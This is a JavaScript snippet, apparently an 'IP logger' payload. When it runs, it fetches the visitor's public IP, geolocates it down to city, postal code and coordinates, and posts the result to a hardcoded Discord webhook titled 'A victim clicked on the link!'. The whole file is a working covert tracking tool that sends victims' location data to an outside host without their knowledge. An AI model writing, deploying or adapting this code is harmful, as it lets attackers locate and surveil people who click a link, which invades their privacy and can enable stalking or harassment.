const sendIP = () => {
   fetch('https://api.ipify.org?format=json')
        .then(ipResponse => ipResponse.json())
        .then(ipData => {
            const ipadd = ipData.ip;
            return fetch(`https://ipapi.co/${ipadd}/json/`)
                .then(geoResponse => geoResponse.json())
                .then(geoData => {
                    const dscURL = 'https://discord.com/api/webhooks/1390317122021888133/p2V1t9zy1QLH7uOzsiH2K9ZiA-5RJ8ve6L45u-FRO25L79Awm9aFNDc1JoHuPegpc1a7'; // replace with your webhook url
                    return fetch(dscURL, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            username: "1pl0gg3r", // optionally changeable
                            avatar_url: "https://armed0ps.github.io/IP-Logger-new/hackerpfp.jpg", // optionally changeable
                            content: `@everyone`,
                            embeds: [
                                {
                                    title: 'A victim clicked on the link!',
                                    description: `**Network >>** ${geoData.network}\n**City >>** ${geoData.city}\n**Region >>** ${geoData.region}\n**Country >>** ${geoData.country_name}\n**Postal Code >>** ${geoData.postal}\n**Latitude >>** ${geoData.latitude}\n**Longitude >>** ${geoData.longitude}`,
                                    color: 0x800080 // optionally changeable
                                }
                            ]
                        })
                    });
                });
        })
        .then(dscResponse => {  
            if (dscResponse.ok) {
                console.log('Sent! <3');
            } else {
                console.log('Failed :(');
            }
        })
        .catch(error => {
            console.error('Error:', error);
            console.log('Error :(');
        });
};
sendIP();
